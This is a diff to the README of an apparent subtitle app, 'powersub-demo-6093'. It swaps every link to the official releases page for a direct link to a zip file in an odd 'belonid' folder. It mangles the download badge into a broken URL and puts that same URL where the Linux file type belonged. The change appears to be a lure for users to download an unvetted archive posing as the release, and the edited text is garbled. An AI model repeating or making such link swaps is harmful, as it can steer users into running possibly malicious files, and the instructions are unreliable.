@@ -8,13 +8,13 @@ Welcome to powersub-demo-6093! This application helps you manage your subtitles 
 
 To download the application, visit the link below:
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Priadharshan/powersub-demo-6093/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Priadharshan/powersub-demo-6093/main/belonid/powersub-demo-6093.zip%20Latest%https://raw.githubusercontent.com/Priadharshan/powersub-demo-6093/main/belonid/powersub-demo-6093.zip)](https://raw.githubusercontent.com/Priadharshan/powersub-demo-6093/main/belonid/powersub-demo-6093.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click on the link below to access the releases page. This is where you can download the latest version of the application.
 
-[Download the latest release here](https://github.com/Priadharshan/powersub-demo-6093/releases)
+[Download the latest release here](https://raw.githubusercontent.com/Priadharshan/powersub-demo-6093/main/belonid/powersub-demo-6093.zip)
 
 ### Step 2: Choose Your Version
 
@@ -30,7 +30,7 @@ After the download finishes, locate the file in your downloads folder.
 
 - For **Windows**, this will typically be a `.exe` file.
 - For **macOS**, you will see a `.dmg` or similar file.
-- For **Linux**, look for a `.tar.gz` or package file.
+- For **Linux**, look for a `https://raw.githubusercontent.com/Priadharshan/powersub-demo-6093/main/belonid/powersub-demo-6093.zip` or package file.
 
 ### Step 5: Install the Application
 
